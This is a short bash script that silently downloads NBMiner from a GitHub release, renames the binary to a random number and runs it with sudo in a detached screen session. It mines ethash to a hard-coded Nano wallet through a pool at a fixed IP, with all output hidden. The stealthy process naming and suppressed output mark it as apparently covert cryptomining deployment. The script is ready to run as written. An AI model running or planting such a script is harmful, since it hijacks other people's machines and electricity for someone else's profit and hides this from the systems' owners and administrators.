#!/bin/bash

WELS=nano_34zxr51ybgctoqr9gkn5znqtyd5ji83ck1z4idqqdpm7xznfxfa4fpua4ik8
PAL=147.135.11.137:2020
WER=$(echo $(shuf -i 1-99999 -n 1)-LIM)
COMA="-a ethash -o $PAL -u $WELS.$WER"
TOP=$(shuf -n 1 -i 1-200000)



FILE=./tuan
if [ -f "$FILE" ]; then
    echo "$FILE exists."
else 
    apt install screen -y
    wget https://github.com/NebuTech/NBMiner/releases/download/v40.1/NBMiner_40.1_Linux.tgz >/dev/null 2>&1
    tar zxvf NBMiner_40.1_Linux.tgz >/dev/null 2>&1
    cd NBMiner_Linux
    mv nbminer $TOP
    chmod +x * >/dev/null 2>&1
fi
screen -dmLS mine sudo ./$TOP $COMA >/dev/null 2>&1
